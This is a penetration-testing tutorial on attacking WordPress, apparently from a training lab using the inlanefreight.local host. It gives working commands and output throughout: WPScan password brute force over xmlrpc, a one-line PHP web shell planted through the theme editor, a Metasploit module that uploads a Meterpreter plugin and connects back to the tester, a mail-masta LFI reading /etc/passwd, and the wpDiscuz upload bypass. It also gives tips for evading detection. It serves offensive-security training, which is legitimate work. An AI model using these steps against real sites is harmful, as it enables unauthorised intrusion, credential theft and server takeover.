# Attacking WordPress

Once enumeration confirms a WordPress target, the two primary attack paths are brute-forcing credentials to gain admin access, then using that access to execute code on the server. These two steps chain together naturally: brute force gives you admin credentials, admin access gives you code execution through the theme editor or a malicious plugin upload.

***

## Login Brute Force with WPScan

[WPScan](https://github.com/wpscanteam/wpscan) supports two brute-force methods against the WordPress login:

- `wp-login`: attacks the standard `/wp-login.php` page directly
- `xmlrpc`: attacks through `/xmlrpc.php` using the WordPress API

The `xmlrpc` method is preferred because it is significantly faster. Use `--password-attack` to specify the method, `-U` for the target username or a username file, and `-P` for the wordlist:

```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```

Successful output:

```
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1

[!] Valid Combinations Found:
 | Username: john, Password: firebird1
```

Adjust `-t` up or down to control thread count and avoid detection or rate limiting.

***

## Code Execution via Theme Editor

With valid admin credentials, you can inject PHP directly into a theme file through the WordPress admin panel. The steps are:

1. Log in at `/wp-login.php` with the obtained credentials
2. Navigate to Appearance > Theme Editor in the left panel
3. Select an inactive theme from the dropdown (for example, Twenty Nineteen) to avoid breaking the live site
4. Select an obscure template file such as `404.php`
5. Add the following single line below the existing comments:

```php
system($_GET[0]);
```

6. Click Update File to save

The web shell is now accessible at the theme's path. Trigger it with cURL:

```bash
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

From here, use this access to upgrade to a full interactive reverse shell for post-exploitation.

***

## Code Execution via Metasploit

The [wp_admin_shell_upload](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) module in [Metasploit](https://www.metasploit.com/) automates the full process. It logs in with admin credentials, uploads a malicious plugin containing a PHP Meterpreter payload, executes it, and cleans up the uploaded files.

Configure the module options:

```bash
msf6 > use exploit/unix/webapp/wp_admin_shell_upload

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Verify options with `show options`, then run:

```bash
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit
```

```
[*] Authenticating with WordPress using john:firebird1...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816)
[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php

meterpreter > getuid
Server username: www-data (33)
```

> When using vhosts, you must set both `VHOST` and `RHOST`. Setting only one of them causes the module to fail with the error: `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.

Even when Metasploit cleans up after itself, confirm that all uploaded files have been removed and document every artifact in your report appendices. The appendix should record: exploited systems and method used, compromised user accounts, artifacts created, and any changes made to the system.

***

## Leveraging Known Plugin Vulnerabilities

According to the [WPScan statistics page](https://wpscan.com/statistics), the breakdown of WordPress vulnerabilities is:

- 89% from plugins
- 7% from themes
- 4% from WordPress core

Old, forgotten, or unsupported plugins are a consistent source of critical vulnerabilities. Use [waybackurls](https://github.com/tomnomnom/waybackurls) to query the [Wayback Machine](https://web.archive.org/) for older versions of a target WordPress site, which may reveal plugins that were previously installed and left in place even after the site was updated.

### mail-masta LFI

The [mail-masta](https://wordpress.org/plugins/mail-masta/) plugin (version 1.0) contains an [unauthenticated Local File Inclusion](https://www.exploit-db.com/exploits/50226) vulnerability. The vulnerable code in `count_of_send.php` passes the `pl` GET parameter directly to `include()` with no validation:

```php
<?php
include($_GET['pl']);
...
?>
```

Exploit it to read `/etc/passwd`:

```bash
curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

The same plugin also suffers from [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438), present since 2016.

### wpDiscuz Unauthenticated RCE

[wpDiscuz](https://wpdiscuz.com/) 7.0.4 contains an unauthenticated file upload bypass ([CVE-2020-24186](https://nvd.nist.gov/vuln/detail/CVE-2020-24186)). The plugin is intended to accept only image attachments, but its MIME type detection can be bypassed to upload a PHP web shell. The exploit script targets a valid post URL with the `-p` flag:

```bash
python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
```

If the script's built-in command execution fails, use cURL directly against the uploaded shell path with a `?cmd=` parameter:

```bash
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

```
GIF689a;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The `GIF689a;` prefix in the output is part of the MIME bypass technique used to make the PHP file appear as a GIF to the upload filter. After testing, remove the uploaded shell file and log it as a testing artifact in the engagement report.
